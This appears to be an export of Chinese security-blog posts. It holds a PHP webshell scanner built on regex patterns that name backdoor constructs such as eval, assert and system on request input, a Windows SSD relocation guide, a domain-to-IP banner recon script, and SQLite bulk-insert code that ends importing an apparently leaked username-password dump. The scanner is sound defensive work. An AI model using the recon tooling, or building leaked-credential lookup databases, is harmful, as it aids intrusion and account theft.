stristr($_SERVER[HTTP_USER_AGENT],'curl') || empty($_SERVER[HTTP_USER_AGENT]) || php_sapi_name() ==='cli')&#123; return PHP_EOL; &#125;else&#123; return ""; &#125;&#125;function is_Browser()&#123;if(!stristr($_SERVER[HTTP_USER_AGENT],'wget'))&#123; return true; &#125;&#125;function DownloadName()&#123; $url="http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; $p=array_slice(explode('/',$url),-1); $t=$p[0]; return rtrim($url,$t);&#125;?&gt; 参考文章windows wget下载]]></content>
  </entry>
  <entry>
    <title><![CDATA[webshell扫描脚本]]></title>
    <url>%2F2016%2F04%2F23%2Fwebshell-scan%2F</url>
    <content type="text"><![CDATA[tools论坛@imspider写了一款 完美扫描PHP特殊一句话后门 感觉挺漂亮的，博主加入了一些其它规则，目前仅支持php。 可扫描 weevelyshell 生成或加密的shell 及各种变异webshell 支持扫描callback一句话shell 支持各种php大马 由于是根据文件内容正则匹配所以不能保证误报漏报想要更强大的webshell扫描推荐用d盾 webshell扫描 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset='gb2312'&gt; &lt;title&gt;PHP web shell scan&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;?php define("SELF",php_self()); error_reporting(E_ERROR);ini_set('max_execution_time',20000);ini_set('memory_limit','512M');header("content-Type: text/html; charset=gb2312");function weevelyshell($file)&#123; $content=file_get_contents($file); if( ( preg_match('#(\$\w&#123;2,4&#125;\s?=\s?str_replace\("\w+","","[\w_]+"\);\s?)+#s',$content)&amp;&amp; preg_match('#(\$\w&#123;2,4&#125;\s?=\s?"[\w\d\+\/\=]+";\s?)+#',$content)&amp;&amp; preg_match('#\$[\w]&#123;2,4&#125;\s?=\s\$[\w]&#123;2,4&#125;\(\'\',\s?\$\w&#123;2,4&#125;\(\$\w&#123;2,4&#125;\("\w&#123;1,4&#125;",\s?"",\s?\$\w&#123;2,4&#125;\.\$\w&#123;2,4&#125;\.\$\w&#123;2,4&#125;\.\$\w&#123;2,4&#125;\)\)\);\s+?\$\w&#123;2,4&#125;\(\)\;#',$content)) || (preg_match('#\$\w+\d\s?=\s?str_replace\(\"[\w\d]+\",\"\",\"[\w\d]+\"\);#s',$content)&amp;&amp; preg_match('#\$\w+\s?=\s?\$[\w\d]+\(\'\',\s?\$[\w\d]+\(\$\w+\(\$\w+\(\"[[:punct:]]+\",\s?\"\",\s?\$\w+\.\$\w+\.\$\w+\.\$\w+\)\)\)\);\s?\$\w+\(\);#s',$content)) )&#123; return true; &#125;&#125;function callbackshell($file)&#123; $content=file_get_contents($file); if( preg_match('#\$\w+\s?=\s?\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[.*?\]#is',$content)&amp;&amp; preg_match('#\$\w+\s?=\s?(?:new)?\s?array\w*\s?\(.*?_(?:GET|POST|REQUEST|COOKIE|SERVER)\[.*?\].*?\)+#is',$content)&amp;&amp; preg_match('#(?:array_(?:reduce|map|udiff|walk|walk_recursive|filter)|u[ak]sort)\s?\(.*?\)+?#is',$content) ) return true;&#125;function php_self()&#123; $php_self=substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1); return $php_self;&#125;$matches = array( '/mb_ereg_replace\([\'\*\s\,\.\"]+\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[[\'\"].*?[\'\"][\]][\,\s\'\"]+e[\'\"]'/is, '/preg_filter\([\'\"\|\.\*e]+.*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)/is', '/create_function\s?\(.*assert\(/is', '/ini_get\(\'safe_mode\'\)/i', '/get_current_user\(.*?\)/i', '/@?assert\s?\(\$.*?\)/i', '/proc_open\s?\(.*?pipe\',\s?\'w\'\)/is', '/sTr_RepLaCe\s?\([\'\"].*?[\'\"],[\'\"].*?[\'\"]\s?,\s?\'a[[:alnum:][:punct:]]+?s[[:alnum:][:punct:]]+?s[[:alnum:][:punct:]]+?e[[:alnum:][:punct:]]+?r[[:alnum:][:punct:]]+?t[[:alnum:][:punct:]]+?\)/i', '/preg_replace_callback\(.*?create_function\(/is', '/filter_var(?:_array)?\s?.*?\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[[\'\"][[:punct:][:alnum:]]+[\'\"]\][[:punct:][:alnum:][:space:]]+?assert[\'\"]\)/is', '/ob_start\([\'\"]+assert[\'\"]+\)/is', '/new\s?ReflectionFunction\(.*?-&gt;invoke\(/is', '/PDO::FETCH_FUNC/', '/\$\w+.*\s?(?:=|-&gt;)\s?.*?[\'\"]assert[\'\"]\)?/i', '/\$\w+-&gt;(?:sqlite)?createFunction\(.*?\)/i', '/eval\([\"\']?\\\?\$\w+\s?=\s?.*?\)/i', '/eval\(.*?gzinflate\(base64_decode\(/i', '/copy\(\$HTTP_POST_FILES\[\'\w+\'\]\s?\[\'tmp_name\'\]/i', '/register_(?:shutdown|tick)_function\s?\(\$\w+,\s\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[.*?\]\)/is', '/register_(?:shutdown|tick)_function\s?\(?[\'\"]assert[\"\'].*?\)/i', '/call_user_func.*?\([\"|\']assert[\"|\'],.*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\[[\'|\"].*\]\)+/is', '/preg_replace\(.*?e.*?\'\s?,\s?.*?\w+\(.*?\)/i', '/function_exists\s*\(\s*[\'|\"](popen|exec|proc_open|system|passthru)+[\'|\"]\s*\)/i', '/(exec|shell_exec|system|passthru)+\s*\(\s*\$_(\w+)\[(.*)\]\s*\)/i', '/(exec|shell_exec|system|passthru)+\s*\(\$\w+\)/i', '/(exec|shell_exec|system|passthru)\s?\(\w+\(\"http_.*\"\)\)/i', '/(?:john\.barker446@gmail\.com|xb5@hotmail\.com|shopen@aventgrup\.net|milw0rm\.com|www\.aventgrup\.net|mgeisler@mgeisler\.net)/i', '/Php\s*?Shell/i', '/((udp|tcp)\:\/\/(.*)\;)+/i', '/preg_replace\s*\((.*)\/e(.*)\,\s*\$_(.*)\,(.*)\)/i', '/preg_replace\s*\((.*)\(base64_decode\(\$/i', '/(eval|assert|include|require|include_once|require_once)+\s*\(\s*(base64_decode|str_rot13|gz(\w+)|file_(\w+)_contents|(.*)php\:\/\/input)+/i', '/(eval|assert|include|require|include_once|require_once|array_map|array_walk)+\s*\(.*?\$_(?:GET|POST|REQUEST|COOKIE|SERVER|SESSION)+\[(.*)\]\s*\)/i', '/eval\s*\(\s*\(\s*\$\$(\w+)/i', '/((?:include|require|include_once|require_once)+\s*\(?\s*[\'|\"]\w+\.(?!php).*[\'|\"])/i', '/\$_(\w+)(.*)(eval|assert|include|require|include_once|require_once)+\s*\(\s*\$(\w+)\s*\)/i', '/\(\s*\$_FILES\[(.*)\]\[(.*)\]\s*\,\s*\$_(GET|POST|REQUEST|FILES)+\[(.*)\]\[(.*)\]\s*\)/i', '/(fopen|fwrite|fputs|file_put_contents)+\s*\((.*)\$_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\](.*)\)/i', '/echo\s*curl_exec\s*\(\s*\$(\w+)\s*\)/i', '/new com\s*\(\s*[\'|\"]shell(.*)[\'|\"]\s*\)/i', '/\$(.*)\s*\((.*)\/e(.*)\,\s*\$_(.*)\,(.*)\)/i', '/\$_\=(.*)\$_/i', '/\$_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\]\(\s*\$(.*)\)/i', '/\$(\w+)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\]\s*\)/i', '/\$(\w+)\s*\(\s*\$\&#123;(.*)\&#125;/i', '/\$(\w+)\s*\(\s*chr\(\d+\)/i');function antivirus($dir,$exs,$matches) &#123; if(($handle = @opendir($dir)) == NULL) return false; while(false !== ($name = readdir($handle))) &#123; if($name == '.' || $name == '..') continue; $path = $dir.$name; if(strstr($name,SELF)) continue; //$path=iconv("UTF-8","gb2312",$path); if(is_dir($path)) &#123; //chmod($path,0777);/*主要针对一些0111的目录*/ if(is_readable($path)) antivirus($path.'/',$exs,$matches); &#125; elseif(strpos($name,';') &gt; -1 || strpos($name,'%00') &gt; -1 || strpos($name,'/') &gt; -1) &#123; echo '特征 &lt;input type="text" style="width:250px;" value="解析漏洞"&gt; '.$path.'&lt;div&gt;&lt;/div&gt;'; flush(); ob_flush(); &#125; else &#123; if(!preg_match($exs,$name)) continue; if(filesize($path) &gt; 10000000) continue; $fp = fopen($path,'r'); $code = fread($fp,filesize($path)); fclose($fp); if(empty($code)) continue; if(weevelyshell($path))&#123; echo '特征 &lt;input type="text" style="width:250px;" value="weevely 加密shell"&gt; '.$path.'&lt;div&gt;&lt;/div&gt;'; flush(); ob_flush(); &#125;elseif(callbackshell($path))&#123; echo '特征 &lt;input type="text" style="width:250px;" value="Callback shell"&gt; '.$path.'&lt;div&gt;&lt;/div&gt;'; flush(); ob_flush(); &#125; foreach($matches as $matche) &#123; $array = array(); preg_match($matche,$code,$array); if(!$array) continue; if(strpos($array[0],"\x24\x74\x68\x69\x73\x2d\x3e")) continue; $len = strlen($array[0]); if($len &gt; 6 &amp;&amp; $len &lt; 200) &#123; echo '特征 &lt;input type="text" style="width:250px;" value="'.htmlspecialchars($array[0]).'"&gt; '.$path.'&lt;div&gt;&lt;/div&gt;'; flush(); ob_flush(); break; &#125; &#125; unset($code,$array); &#125; &#125; closedir($handle); return true;&#125;function strdir($str) &#123; return str_replace(array('\\','//','//'),array('/','/','/'),chop($str)); &#125;echo '&lt;form method="POST"&gt;';echo '路径: &lt;input type="text" name="dir" value="'.($_POST['dir'] ? strdir($_POST['dir'].'/') : strdir($_SERVER['DOCUMENT_ROOT'].'/')).'" style="width:398px;"&gt;&lt;div&gt;&lt;/div&gt;';echo '后缀: &lt;input type="text" name="exs" value="'.($_POST['exs'] ? $_POST['exs'] : '.php|.inc|.phtml').'" style="width:398px;"&gt;&lt;div&gt;&lt;/div&gt;';echo '操作: &lt;input type="submit" style="width:80px;" value="scan"&gt;&lt;div&gt;&lt;/div&gt;';echo '&lt;/form&gt;';if(file_exists($_POST['dir']) &amp;&amp; $_POST['exs']) &#123; $dir = strdir($_POST['dir'].'/'); $exs = '/('.str_replace('.','\\.',$_POST['exs']).')/i'; echo antivirus($dir,$exs,$matches) ? '&lt;/br &gt;&lt;div&gt;&lt;/div&gt;扫描完毕!' : '&lt;/br &gt; &lt;div&gt;&lt;/div&gt;扫描中断';&#125;?&gt;&lt;/html&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[windows 7 小容量ssd硬盘解决方案]]></title>
    <url>%2F2015%2F05%2F24%2FSmall-ssd%2F</url>
    <content type="text"><![CDATA[文章发表于T00ls参考资料 超级本 通常都设计 得 小、薄、待机长、开机速度快体积小 功耗小 就得牺牲 硬件性能通常超级本 都配置一个 小容量的(固态硬盘) ssd 我测试的机器固态硬盘体积22GB 左右( thinkpad x230s)完全不能愉快的 安装一个正常版的win7 我们可以把系统相关目录转移到 大的磁盘(机械)分区 c: 盘为系统盘 固态硬盘 (ssd)d: 盘为软件安装盘 机械硬盘(hdd) 在安装系统时(非ghos安装) 切记：最后一次重启，系统要求设置用户名和密码时候按住 shitf+f10 进入命令行 执行下面命令 一定不要在 系统以安装完成作以下操作 否则会出现故障 以下命令纯手敲 未经过验证 非专业人士请勿使用在使用过程中一定要注意盘符 有可能 d:为u盘命令行 运行 compmgmt.msc 或diskpart 命令 进行磁盘管理 重新分配盘符 12345678910111213141516171819202122robocopy &quot;C:\Users&quot; &quot;D:\Users&quot; /E /COPYALL /XJ /V /ZBrobocopy &quot;C:\Program Files&quot; &quot;D:\Program Files&quot; /E /COPYALL /XJ /V /ZBrobocopy &quot;C:\Program Files (x86)&quot; &quot;D:\Program Files (x86)&quot; /E /COPYALL /XJ /V /ZBrobocopy &quot;C:\ProgramData&quot; &quot;D:\ProgramData&quot; /E /COPYALL /XJ /V /ZBrmdir &quot;C:\Users&quot; /S /Qrmdir &quot;C:\Program Files&quot; /S /Qrmdir &quot;C:\Program Files (x86)&quot; /S /Qrmdir &quot;C:\ProgramData&quot; /S /Qmklink /J &quot;C:\Users&quot; &quot;D:\Users&quot;mklink /J &quot;C:\Program Files&quot; &quot;D:\Program Files&quot;mklink /J &quot;C:\Program Files (x86)&quot; &quot;D:\Program Files (x86)&quot;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v CommonFilesDir /t REG_SZ /d &quot;d:\Program Files\Common Files&quot; /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v &quot;CommonFilesDir (x86)&quot; /t REG_SZ /d &quot;d:\Program Files (x86)\Common Files&quot; /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v CommonW6432Dir /t REG_SZ /d &quot;d:\Program Files\Common Files&quot; /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v programfilesdir /t REG_SZ /d &quot;d:\Program Files&quot; /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v &quot;programfilesdir (x86)&quot; /t REG_SZ /d &quot;d:\Program Files (x86)&quot; /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v programw6432dir /t REG_SZ /d &quot;d:\Program Files&quot; /freg add HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion\ProfileList /v ProfilesDirectory /t REG_EXPAND_SZ /d d:\Users /freg add HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion\ProfileList /v Default /t REG_EXPAND_SZ /d d:\Users\Default /freg add HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion\ProfileList /v Public /t REG_EXPAND_SZ /d d:\Users\Public /freg add HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion\ProfileList /v ProgramData /t REG_EXPAND_SZ /d d:\ProgramData /f 进入系统后 以管理员权限 运行cmd 123rmdir &quot;C:\ProgramData&quot; /S /Qmklink /J &quot;C:\ProgramData&quot; &quot;D:\ProgramData&quot; 或以当前用户运行(未验证该方法) 1takeown /f &quot;c:\ProgramData&quot; /r /d y &amp;&amp; icacls &quot;c:\ProgramData&quot; /grant %USERNAME%:F /T &amp;&amp; rmdir c:\ProgramData /s /q &amp;&amp; mklink /J &quot;C:\ProgramData&quot; &quot;D:\ProgramData&quot; 查看c 盘隐藏文件 我们会发现 有两个可恶的文件 占数GB 甚至数十GB 磁盘空间！分别是 pagefile.sys hiberfil.sys 用如下方法 移动 或清理它清理windows 7 休眠文件 关闭休眠 powercfg -h off清理 移动虚拟内存文件 管理员 权限运行命令行 123wmic pagefileset list /format:list 查看 虚拟内存设置wmic pagefileset create name=&apos;d:\pagefile.sys&apos;,initialsize=0,maximumsize=0wmic pagefileset where&quot;name=&apos;c:\\pagefile.sys&apos;&quot; delete]]></content>
      <tags>
        <tag>电脑基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[批量域名转ip及相关信息]]></title>
    <url>%2F2015%2F05%2F24%2Fhost2ip%2F</url>
    <content type="text"><![CDATA[功能描述：将大量的域名转换成ip 按ip排序 并获取服务器基本信息 使用场景：如某个大型网络 我们获取了数千子域名有多个网段我们通过ip 以及服务器基本信息 判断 域名所对应的网段 及所采用的 WebServer 服务器 版本 该脚本采用 多进程技术 加快了转换速度控制超时时间 防止 执行卡死 丢弃 无法访问的 ip使用前请确认您dns 解析速度够快建议将dns 设置为 8.8.8.8 或114.114.114.114或挂海外vpn以获取最佳结果由于该脚本使用wmi 控制多进程所以仅支持windows，linux下用其它技术实现该脚本调用php 模块：pdo_sqlite curl 使用前请确认 您的php 开启相关模块使用前请不要修改文件名字 windows 命令行下： commandline &gt; php host2ip.php host.txthost.txt 为多个 网站域名文件执行完毕将会在当前目录生成result.txt的结果文件 resolveip.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpisset($argv[1]) ? $host = trim($argv[1]) : exit();include 'sqlite.php';$sql = new sqllite();$result = _gethostbyname($host);//域名转ipfunction _gethostbyname($host) &#123; $ip = gethostbyname($host); if (chk_ip($ip)) &#123; $i['host'] = $host; $i['ip'] = $ip; return $i; &#125;&#125;if (!empty($result['ip'])) &#123; $sc = $sql-&gt;server_ip_exit($result['ip']); if ($sc != 0) &#123; $serv = $sql-&gt;get_server($result['ip']); $sql-&gt;insert($result['host'], $result['ip'], $serv); &#125; else &#123; $server = get_server($result['ip']); $sql-&gt;insert($result['host'], $result['ip'], $server); &#125;&#125;function get_server($host) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $host); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_NOBODY, true); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A'); curl_setopt($ch, CURLOPT_TIMEOUT, 5); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); $head = curl_exec($ch); preg_match_all('/^(?:Server|X-Powered-By):\s([^[:cntrl:]]+)/im', $head, $server); $info = $server[1]; $c = count($info); empty($info) ? $banner = false : $banner = true; if ($banner &amp;&amp; $c != 0) &#123; $c == 2 ? $return = $info[0] . ' | ' . $info[1] : $return = $info[0]; &#125; else &#123; return '(none)'; &#125; return $return;&#125;function chk_ip($ip) &#123; if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE) &amp;&amp; substr($ip, 0, 4) != '127.' &amp;&amp; substr($ip, 0, 4) != '255.' &amp;&amp; $ip != '0.0.0.0') &#123; return $ip; &#125; else &#123; return false; &#125;&#125;?&gt; host2ip.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?phpdate_default_timezone_set('PRC');$start_time = func_time();is_file($argv[1])?$hostfile=$argv[1]:exit("php $argv[0] host.txt");$list=geturllist($hostfile);$counts=sizeof($list); $Refresh=3000000;//刷新时间3 秒$thread=20; //并发$ExecTimeout=10;//$chunk=array_chunk($list,$thread);//从0 开始printf("[i] 数量 %d 条,线程数%d ,刷新时间%d微秒,超时时间 %d秒\r\n",$counts,$thread,$Refresh,$ExecTimeout);usleep(500000);echo "程序执行中...\r\n";foreach ($list as $c )&#123; $task= task('resolveip.php',$ExecTimeout); back_run('php.exe resolveip.php '.$c); if($task &gt;= $thread)&#123; usleep($Refresh); &#125; &#125;function task($taskname,$ExecTimeout)&#123;$LocalWMISvc=new com('WinMgmts:&#123;impersonationLevel=impersonate&#125;!\\\\.\root\CIMV2');$QueryObjSet=$LocalWMISvc-&gt;ExecQuery("select * from win32_process where commandline like '%&#123;$taskname&#125;%' and (name='php.exe' or name='cmd.exe')");$taskcount= $QueryObjSet-&gt;Count;foreach ($QueryObjSet as $process)&#123;if((func_time() - strtotime(substr($process-&gt;CreationDate,0,14))) &gt;= $ExecTimeout)&#123; @exec("taskkill -pid $process-&gt;ProcessId /f 2&gt;nul",$o,$r); //超时则强制退出 &#125;&#125;return $taskcount; //返回进程数&#125;function back_run($cmd)&#123; pclose(popen("start /B ". $cmd , "r")); &#125;function _echo($str)&#123;echo $str.PHP_EOL;&#125;function func_time()&#123; list($microsec, $sec) = explode(' ', microtime()); return $sec;&#125;function geturllist($hostfile)&#123;$urllist=file($hostfile);if(is_array($urllist))&#123; $arr=array_unique($urllist); $url=''; $urls='';foreach ($arr as $s)&#123; $p = array( '/(http|https|ftp):\/\//i', '/\//i', '/\s*?/', ); $url = preg_replace($p, "", $s); if(!empty($url))&#123; $urls[]=$url; &#125;&#125;&#125;return $urls;&#125;sleep(1);if(task('resolveip.php',$ExecTimeout) !=0)&#123;sleep(5);&#125;include 'sqlite.php';$sql=new sqllite();$c=$sql-&gt;show_count();$Etime=round((func_time() - $start_time), 4);$fs=($counts-$c);printf("共 %d host , 转换成功 %d 条, 失败 %d 条\r\n耗时:%d 秒 \r\n\r\n",$counts,$c,$fs,$Etime);$sql-&gt;dump();//$sql-&gt;deleteTable();$sql=null;?&gt; sqlite.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137&lt;?phpclass sqllite&#123; private $ResultFile = 'result.txt'; private $r_db; private $r_table = 'url2ip'; public function __construct() &#123; try &#123; $this-&gt;r_db = new PDO('sqlite:url2ip.db', null, null, array(PDO::ATTR_PERSISTENT =&gt; true)); //存储结果集 //初始化 创建相应的表 $sql = "PRAGMA synchronous = OFF;"; $sql.= &lt;&lt;&lt;EOFCREATE TABLE IF NOT EXISTS &#123;$this-&gt;r_table&#125; ( 'id' INTEGER primary key AUTOINCREMENT NOT NULL, 'domain' varchar(50) NOT NULL , 'ip' varchar(20) NOT NULL, 'server' varchar(100) );CREATE UNIQUE INDEX 'unique_&#123;$this-&gt;r_table&#125;'ON 'url2ip' ('domain' ASC, 'ip' ASC);EOF; $this-&gt;r_db-&gt;exec($sql); &#125; catch(PDOException $ex) &#123; die("[Error] " . $ex-&gt;getMessage() . PHP_EOL . ' add/edit in php.ini' . PHP_EOL . ' extension=pdo_sqlite.so or pdo_sqlite.dll' . PHP_EOL); &#125; &#125; public function insert($value1, $value2, $value3 = NULL) &#123; $db = $this-&gt;r_db; $sql = &lt;&lt;&lt;EOFinsert into &#123;$this-&gt;r_table&#125;('domain','ip','server') VALUES ('&#123;$value1&#125;', '&#123;$value2&#125;','&#123;$value3&#125;') ;EOF; $db-&gt;exec($sql); &#125; public function show_result() &#123; $sql = &lt;&lt;&lt;EOFSELECT domain,ip,server from &#123;$this-&gt;r_table&#125; ORDER BY ip;EOF; $sql = $this-&gt;r_db-&gt;query($sql); $result = $sql-&gt;fetchAll(); return $result; &#125; public function show_count() &#123; $sql = &lt;&lt;&lt;EOFSELECT count(*) from &#123;$this-&gt;r_table&#125;;EOF; $result = $this-&gt;r_db-&gt;prepare($sql); $result-&gt;execute(); $result = $result-&gt;fetch(); return $result[0]; &#125; public function deleteTable() &#123; $db = $this-&gt;r_db; $sql = &lt;&lt;&lt;EOFdrop table if exists &#123;$this-&gt;r_table&#125;;delete from sqlite_sequence;EOF; $db-&gt;exec($sql); &#125; public function server_ip_exit($ip) &#123; $sql = &lt;&lt;&lt;EOFSELECT count(*) from &#123;$this-&gt;r_table&#125; where ip='&#123;$ip&#125;' and server not NULL; //该ip server无值EOF; $result = $this-&gt;r_db-&gt;prepare($sql); $result-&gt;execute(); $result = $result-&gt;fetch(); return $result[0]; &#125; public function get_server($ip) &#123; $sql = &lt;&lt;&lt;EOFselect server from &#123;$this-&gt;r_table&#125; where ip='&#123;$ip&#125;' and server is not null limit 1;EOF; $result = $this-&gt;r_db-&gt;prepare($sql); $result-&gt;execute(); $result = $result-&gt;fetch(); return $result[0]; &#125; /* public function update_server($server,$ip)&#123; $db=$this-&gt;r_db; $sql =&lt;&lt;&lt;EOF update &#123;$this-&gt;r_table&#125; set server='&#123;$server&#125;' where ip='&#123;ip&#125;'; EOF; $db-&gt;exec($sql); &#125; */ public function import($file) &#123; if (FALSE !== ($fp = fopen($file, 'r'))) &#123; $db = $this-&gt;r_db; $db-&gt;beginTransaction(); while (!feof($fp)) &#123; $buffer = trim(fgets($fp, 1024)); list($host, $ip, $server) = preg_split('/\s+/', $buffer); $sql = "insert into &#123;$this-&gt;r_table&#125;('domain','ip','server') VALUES ('&#123;$host&#125;', '&#123;$ip&#125;','$server') ;"; $db-&gt;exec($sql); &#125; $db-&gt;commit(); fclose($fp); return true; &#125; &#125; public function dump() &#123; $results = $this-&gt;show_result(); if (!empty($results) &amp;&amp; is_array($results)) &#123; foreach ($results as $key =&gt; $r) &#123; file_put_contents($this-&gt;ResultFile, str_pad($r['domain'], 50, ' ') . str_pad($r['ip'], 50, ' ') . str_pad($r['server'], 100, ' ') . PHP_EOL, FILE_APPEND); &#125; echo 'Dump Sussess! SaveTo: ' . $this-&gt;ResultFile; &#125; else &#123; exit("Dump Fail..! The Result is the empty... \r\n"); &#125; &#125; public function __destruct() &#123; $this-&gt;r_db = null; &#125;&#125;?&gt;]]></content>
      <tags>
        <tag>多进程 php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlite 高速插入文本文件]]></title>
    <url>%2F2015%2F05%2F24%2Fsqlite-fast%2F</url>
    <content type="text"><![CDATA[文章首发：t00ls本文参考文章为什么要用sqlite ?1、想将数据放进移动存储设备方便随时随地查询2、sqlite 跨平台 ，无需服务，仅一个可执行文件即可 需解决的问题：sqlite 按常规插入数据是非常慢的，不适合插入大数据采用下面的方法后 速度 大大的增加，数G文本 入库都 非常快(相对) 采用技术：1、关闭写同步(synchronous)说明： 简要说来，full写入速度最慢，但保证数据是安全的，不受断电、系统崩溃等影响，而off可以加速数据库的一些操作，但如果系统崩溃或断电，则数据库可能会损毁。SQLite3中，该选项的默认值就是full，如果我们再插入数据前将其改为off，则会提高效率。如果仅仅将SQLite当做一种临时数据库的话，完全没必要设置为full 2、执行准备 prepare 说明： SQLite执行SQL语句的时候，有两种方式：一种是使用前文提到的函数sqlite3_exec()，该函数直接调用包含SQL语句的字符串；另一种方法就是“执行准备”（类似于存储过程）操作，即先将SQL语句编译好，然后再一步一步（或一行一行）地执行。如果采用前者的话，就算开起了事务，SQLite仍然要对循环中每一句SQL语句进行“词法分析”和“语法分析”，这对于同时插入大量数据的操作来说，简直就是浪费时间。因此，要进一步提高插入效率的话，就应该使用后者。 3、显式开启事务 BEGIN…COMMIT说明： SQLite的数据库本质上来讲就是一个磁盘上的文件，所以一切的数据库操作其实都会转化为对文件的操作，而频繁的文件操作将会是一个很好时的过程，会极大地影响数据库存取的速度。 采用该种方法 就是将全部要执行的SQL语句先缓存在内存当中，然后等到COMMIT的时候一次性的写入数据库，这样数据库文件只被打开关闭了一次，效率自然大大的提高。4、查询的话普通索引依旧很慢 我们可以采用fulltext 索引 速度比mysql快 下面我们将1千万数据插入sqlite 看看消耗多少时间php test.php 测试代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;?php$t1 = microtime(true);ini_set("memory_limit",'-1');class sqllite&#123; private $r_db; private $r_table='test'; public function __construct() &#123; try&#123; $this-&gt;r_db=new PDO('sqlite:test.db3');$sql =&lt;&lt;&lt;EOFPRAGMA temp_store = memory;PRAGMA locking_mode = EXCLUSIVE;PRAGMA synchronous = OFF;PRAGMA cache_size = 400000;PRAGMA page_size = 4096;PRAGMA auto_vacuum=NONE;PRAGMA count_changes = OFF;PRAGMA journal_mode = OFF;CREATE TABLE IF NOT EXISTS &#123;$this-&gt;r_table&#125; ( 'id' INTEGER primary key AUTOINCREMENT NOT NULL, 'test' char(15) NOT NULL);EOF;//exit($sql.PHP_EOL);$this-&gt;r_db-&gt;exec($sql); &#125; catch (PDOException $ex)&#123; die ("[Error] ".$ex-&gt;getMessage() .PHP_EOL. ' sudo apt-get install php5-sqlite php5-pdo'.PHP_EOL. ' add/edit in php.ini'.PHP_EOL. ' extension=pdo.so or pdo_sqlite.dll'.PHP_EOL ); &#125; &#125; public function show_count()&#123;$sql =&lt;&lt;&lt;EOFSELECT count(id) from &#123;$this-&gt;r_table&#125;;EOF;$result=$this-&gt;r_db-&gt;prepare($sql);$result-&gt;execute();$result= $result-&gt;fetch();return $result[0];&#125;public function deleteTable()&#123;$db=$this-&gt;r_db; $sql =&lt;&lt;&lt;EOFdrop table if exists &#123;$this-&gt;r_table&#125;;drop INDEX if exists qq_idx;delete from sqlite_sequence;vacuum;EOF;$db-&gt;exec($sql);&#125;public function import()&#123;$db=$this-&gt;r_db;$db-&gt;beginTransaction();for ($i=1;$i&lt;=10000000;$i++)&#123;$sql ="insert into &#123;$this-&gt;r_table&#125;('test') VALUES ('&#123;$i&#125;');";//echo $sql.PHP_EOL;$db-&gt;exec($sql);&#125;$db-&gt;commit();&#125;public function __destruct() &#123; $this-&gt;r_db=null; &#125;&#125; $sql=new sqllite();$sql-&gt;import();$t2 = microtime(true);echo '插入 10000000 条数据'.PHP_EOL;echo '耗时'.round($t2-$t1,3).'秒';?&gt; 下面的例子就是将某文本文件(某数据库)插入数据库建议先用shell命令 处理好 再入库 减少php操作 (如剔除 不规则字符 、转换编码 格式规范)awk sed grep… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpini_set("memory_limit",'-1');$table='sgk';$txt='moko.txt'; //要导入的文本$from='moko'; //数据来源//$db=$from.'.db3'; //测试临时库名empty($db)?$db='sgk.db3':$db;//$index="&#123;$table&#125;_idx";$db = new SQLite3($db);$s =&lt;&lt;&lt;EOFPRAGMA temp_store = memory;PRAGMA locking_mode = EXCLUSIVE;PRAGMA synchronous = OFF;PRAGMA cache_size = 400000;PRAGMA page_size = 4096;PRAGMA auto_vacuum=NONE;PRAGMA count_changes = OFF;PRAGMA journal_mode = OFF;CREATE TABLE IF NOT EXISTS &#123;$table&#125; ( 'id' INTEGER primary key AUTOINCREMENT NOT NULL, 'uname' char(15) NOT NULL , 'pass' char(25) NOT NULL,'from' char(15) NULL);EOF;$db-&gt;exec($s);$sql ="insert into &#123;$table&#125;('uname','pass','from') VALUES (?,?,'&#123;$from&#125;');";$stmt = 